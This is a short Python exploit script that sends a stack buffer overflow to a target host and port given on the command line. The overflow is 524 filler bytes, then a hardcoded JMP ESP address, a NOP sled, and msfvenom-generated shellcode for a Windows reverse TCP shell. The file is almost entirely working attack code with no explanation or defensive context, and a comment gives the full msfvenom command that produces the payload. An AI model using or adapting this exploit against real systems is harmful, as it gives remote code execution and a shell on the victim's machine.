import socket
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', required=True)
parser.add_argument('-p', '--port', type=int, required=True)

args = parser.parse_args()

jmp_esp_address = b'\xf1\x12\x17\x31'
# msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -a x86 -b "\x00" -f c
shellcode = (b"\xba\xcc\xcb\x59\xe6\xdb\xdb\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
             b"\x52\x83\xe8\xfc\x31\x50\x0e\x03\x9c\xc5\xbb\x13\xe0\x32\xb9"
             b"\xdc\x18\xc3\xde\x55\xfd\xf2\xde\x02\x76\xa4\xee\x41\xda\x49"
             b"\x84\x04\xce\xda\xe8\x80\xe1\x6b\x46\xf7\xcc\x6c\xfb\xcb\x4f"
             b"\xef\x06\x18\xaf\xce\xc8\x6d\xae\x17\x34\x9f\xe2\xc0\x32\x32"
             b"\x12\x64\x0e\x8f\x99\x36\x9e\x97\x7e\x8e\xa1\xb6\xd1\x84\xfb"
             b"\x18\xd0\x49\x70\x11\xca\x8e\xbd\xeb\x61\x64\x49\xea\xa3\xb4"
             b"\xb2\x41\x8a\x78\x41\x9b\xcb\xbf\xba\xee\x25\xbc\x47\xe9\xf2"
             b"\xbe\x93\x7c\xe0\x19\x57\x26\xcc\x98\xb4\xb1\x87\x97\x71\xb5"
             b"\xcf\xbb\x84\x1a\x64\xc7\x0d\x9d\xaa\x41\x55\xba\x6e\x09\x0d"
             b"\xa3\x37\xf7\xe0\xdc\x27\x58\x5c\x79\x2c\x75\x89\xf0\x6f\x12"
             b"\x7e\x39\x8f\xe2\xe8\x4a\xfc\xd0\xb7\xe0\x6a\x59\x3f\x2f\x6d"
             b"\x9e\x6a\x97\xe1\x61\x95\xe8\x28\xa6\xc1\xb8\x42\x0f\x6a\x53"
             b"\x92\xb0\xbf\xf4\xc2\x1e\x10\xb5\xb2\xde\xc0\x5d\xd8\xd0\x3f"
             b"\x7d\xe3\x3a\x28\x14\x1e\xad\x28\xe9\x20\x2c\xbf\xeb\x20\x3f"
             b"\x63\x65\xc6\x55\x8b\x23\x51\xc2\x32\x6e\x29\x73\xba\xa4\x54"
             b"\xb3\x30\x4b\xa9\x7a\xb1\x26\xb9\xeb\x31\x7d\xe3\xba\x4e\xab"
             b"\x8b\x21\xdc\x30\x4b\x2f\xfd\xee\x1c\x78\x33\xe7\xc8\x94\x6a"
             b"\x51\xee\x64\xea\x9a\xaa\xb2\xcf\x25\x33\x36\x6b\x02\x23\x8e"
             b"\x74\x0e\x17\x5e\x23\xd8\xc1\x18\x9d\xaa\xbb\xf2\x72\x65\x2b"
             b"\x82\xb8\xb6\x2d\x8b\x94\x40\xd1\x3a\x41\x15\xee\xf3\x05\x91"
             b"\x97\xe9\xb5\x5e\x42\xaa\xd6\xbc\x46\xc7\x7e\x19\x03\x6a\xe3"
             b"\x9a\xfe\xa9\x1a\x19\x0a\x52\xd9\x01\x7f\x57\xa5\x85\x6c\x25"
             b"\xb6\x63\x92\x9a\xb7\xa1")

buffer = b'A' * 524 + jmp_esp_address + b'\x90' * 32 + shellcode
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(2)
s.connect((args.target, args.port))
s.recv(1024)

s.send(buffer)
s.close()
